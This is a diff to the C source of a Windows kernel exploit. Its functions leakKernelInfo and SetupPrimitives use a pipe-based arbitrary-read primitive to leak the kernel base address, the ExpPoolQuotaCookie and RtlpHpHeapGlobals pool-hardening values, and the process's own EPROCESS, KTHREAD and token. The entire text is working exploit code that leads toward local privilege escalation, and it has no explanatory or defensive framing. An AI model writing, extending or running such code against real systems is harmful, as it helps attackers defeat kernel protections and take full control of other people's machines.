@@ -91,20 +91,18 @@ int leakKernelInfo(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
     addrs->kernel_base = kernel_base;
     printf("[+] Kernel base address: 0x%llX\n", kernel_base);
 
+    ArbitraryRead(ghost_pipe, kernel_base + nt_ExpPoolQuotaCookie_OFFSET, (char*)&addrs->ExpPoolQuotaCookie, 0x8);
+    printf("[+] ExpPoolQuotaCookie: 0x%llX\n", addrs->ExpPoolQuotaCookie);
+
+    ArbitraryRead(ghost_pipe, addrs->kernel_base + nt_RtlpHpHeapGlobals_OFFSET, (char*)&addrs->RtlpHpHeapGlobals, 0x8);
+    printf("[+] RtlpHpHeapGlobals: 0x%llx\n", addrs->RtlpHpHeapGlobals);
+
     addrs->self_eprocess = findSelfEprocess(ghost_pipe, kernel_base);
     printf("[+] Self EPROCESS: 0x%llX\n", addrs->self_eprocess);
-
-    uintptr_t self_token;
-    ArbitraryRead(ghost_pipe, addrs->self_eprocess + EPROCESS_TOKEN_OFFSET, (char*)&self_token, 0x8);
-    self_token &= (~0xF); // Clear reference count bits
-    printf("[+] Self EPROCESS token: 0x%llX\n", self_token);
 
     ArbitraryRead(ghost_pipe, (uintptr_t)(addrs->self_eprocess + EPROCESS_KTHREAD_OFFSET), (char*)&addrs->self_kthread, 8);
     addrs->self_kthread -= KTHREAD_THREAD_LIST_ENTRY;
     printf("[+] Self KTHREAD: 0x%llX\n", addrs->self_kthread);
-
-    ArbitraryRead(ghost_pipe, kernel_base + nt_ExpPoolQuotaCookie_OFFSET, (char*)&addrs->ExpPoolQuotaCookie, 0x8);
-    printf("[+] ExpPoolQuotaCookie: 0x%llX\n", addrs->ExpPoolQuotaCookie);
 
     return 1;
 }
@@ -121,7 +119,7 @@ int SetupPrimitives(exploit_addresses_t* addrs)
     }
 
     puts("\n## 1.2 Extracting critical kernel information\n");
-    if (!leakKernelInfo(pipes.ghost_pipe, addrs))
+    if (!leakKernelInfo(&pipes.ghost_chunk_pipe, addrs))
     {
         fprintf(stderr, "[-] Failed to extract kernel info\n");
         return 0;
